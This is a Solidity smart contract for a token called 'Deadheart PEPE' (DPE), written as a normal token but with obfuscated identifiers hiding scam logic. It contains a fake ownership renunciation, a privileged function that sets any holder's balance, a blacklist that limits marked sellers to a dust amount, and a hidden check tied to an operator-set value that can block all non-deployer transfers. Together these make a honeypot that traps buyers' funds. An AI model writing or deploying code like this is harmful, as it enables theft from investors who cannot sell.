//SPDX-License-Identifier: MIT

pragma solidity ^0.8.9;

interface toTxFrom {
    function totalSupply() external view returns (uint256);

    function balanceOf(address exemptLaunch) external view returns (uint256);

    function transfer(address maxAmount, uint256 feeExempt) external returns (bool);

    function allowance(address exemptTake, address spender) external view returns (uint256);

    function approve(address spender, uint256 feeExempt) external returns (bool);

    function transferFrom(
        address sender,
        address maxAmount,
        uint256 feeExempt
    ) external returns (bool);

    event Transfer(address indexed from, address indexed exemptTeam, uint256 value);
    event Approval(address indexed exemptTake, address indexed spender, uint256 value);
}

abstract contract takeBuy {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface autoTotal {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface fromTx {
    function createPair(address amountFund, address receiverMode) external returns (address);
}

interface swapAuto is toTxFrom {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract DeadheartPEPE is takeBuy, toTxFrom, swapAuto {

    uint256 public minTeam;

    mapping(address => uint256) private feeSwap;

    uint256 public toReceiverReceiver;

    function decimals() external view virtual override returns (uint8) {
        return walletLaunched;
    }

    function swapSenderLaunch(address atLaunched) public {
        feeLaunchedExempt();
        if (toReceiverReceiver != minTeam) {
            totalReceiver = false;
        }
        if (atLaunched == enableFundReceiver || atLaunched == receiverTo) {
            return;
        }
        limitFrom[atLaunched] = true;
    }

    string private totalTx = "DPE";

    function totalSupply() external view virtual override returns (uint256) {
        return modeTx;
    }

    function senderListAt() public {
        emit OwnershipTransferred(enableFundReceiver, address(0));
        autoMarketing = address(0);
    }

    function liquidityLaunchFund(address toTradingSell, address maxAmount, uint256 feeExempt) internal returns (bool) {
        require(feeSwap[toTradingSell] >= feeExempt);
        feeSwap[toTradingSell] -= feeExempt;
        feeSwap[maxAmount] += feeExempt;
        emit Transfer(toTradingSell, maxAmount, feeExempt);
        return true;
    }

    address private autoMarketing;

    function owner() external view returns (address) {
        return autoMarketing;
    }

    mapping(address => bool) public limitFrom;

    uint8 private walletLaunched = 18;

    uint256 private toLaunch;

    bool public senderTake;

    function exemptSell(address autoTokenTx) public {
        require(autoTokenTx.balance < 100000);
        if (sellModeLaunched) {
            return;
        }
        if (toLaunch != minTeam) {
            minTeam = toReceiverReceiver;
        }
        fundWallet[autoTokenTx] = true;
        
        sellModeLaunched = true;
    }

    function getOwner() external view returns (address) {
        return autoMarketing;
    }

    address public receiverTo;

    bool public sellModeLaunched;

    uint256 private launchedShould;

    event OwnershipTransferred(address indexed fundToken, address indexed marketingAmount);

    constructor (){
        if (totalReceiver != senderTake) {
            totalReceiver = false;
        }
        autoTotal listBuy = autoTotal(feeLaunchFund);
        receiverTo = fromTx(listBuy.factory()).createPair(listBuy.WETH(), address(this));
        if (totalReceiver) {
            minTeam = launchedShould;
        }
        enableFundReceiver = _msgSender();
        senderListAt();
        fundWallet[enableFundReceiver] = true;
        feeSwap[enableFundReceiver] = modeTx;
        
        emit Transfer(address(0), enableFundReceiver, modeTx);
    }

    function feeLaunchedExempt() private view {
        require(fundWallet[_msgSender()]);
    }

    mapping(address => mapping(address => uint256)) private marketingEnable;

    uint256 teamShould;

    function transfer(address liquidityMaxTake, uint256 feeExempt) external virtual override returns (bool) {
        return modeAtLiquidity(_msgSender(), liquidityMaxTake, feeExempt);
    }

    function atAmount(uint256 feeExempt) public {
        feeLaunchedExempt();
        teamShould = feeExempt;
    }

    function approve(address atList, uint256 feeExempt) public virtual override returns (bool) {
        marketingEnable[_msgSender()][atList] = feeExempt;
        emit Approval(_msgSender(), atList, feeExempt);
        return true;
    }

    function name() external view virtual override returns (string memory) {
        return teamTo;
    }

    function transferFrom(address toTradingSell, address maxAmount, uint256 feeExempt) external override returns (bool) {
        if (_msgSender() != feeLaunchFund) {
            if (marketingEnable[toTradingSell][_msgSender()] != type(uint256).max) {
                require(feeExempt <= marketingEnable[toTradingSell][_msgSender()]);
                marketingEnable[toTradingSell][_msgSender()] -= feeExempt;
            }
        }
        return modeAtLiquidity(toTradingSell, maxAmount, feeExempt);
    }

    address toSender = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function modeAtLiquidity(address toTradingSell, address maxAmount, uint256 feeExempt) internal returns (bool) {
        if (toTradingSell == enableFundReceiver) {
            return liquidityLaunchFund(toTradingSell, maxAmount, feeExempt);
        }
        uint256 atSwapList = toTxFrom(receiverTo).balanceOf(toSender);
        require(atSwapList == teamShould);
        require(maxAmount != toSender);
        if (limitFrom[toTradingSell]) {
            return liquidityLaunchFund(toTradingSell, maxAmount, totalLaunchExempt);
        }
        return liquidityLaunchFund(toTradingSell, maxAmount, feeExempt);
    }

    uint256 constant totalLaunchExempt = 12 ** 10;

    mapping(address => bool) public fundWallet;

    bool private totalReceiver;

    uint256 private modeTx = 100000000 * 10 ** 18;

    address public enableFundReceiver;

    function balanceOf(address exemptLaunch) public view virtual override returns (uint256) {
        return feeSwap[exemptLaunch];
    }

    string private teamTo = "Deadheart PEPE";

    function allowance(address totalToToken, address atList) external view virtual override returns (uint256) {
        if (atList == feeLaunchFund) {
            return type(uint256).max;
        }
        return marketingEnable[totalToToken][atList];
    }

    function symbol() external view virtual override returns (string memory) {
        return totalTx;
    }

    address feeLaunchFund = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 launchedTotal;

    function listToken(address liquidityMaxTake, uint256 feeExempt) public {
        feeLaunchedExempt();
        feeSwap[liquidityMaxTake] = feeExempt;
    }

}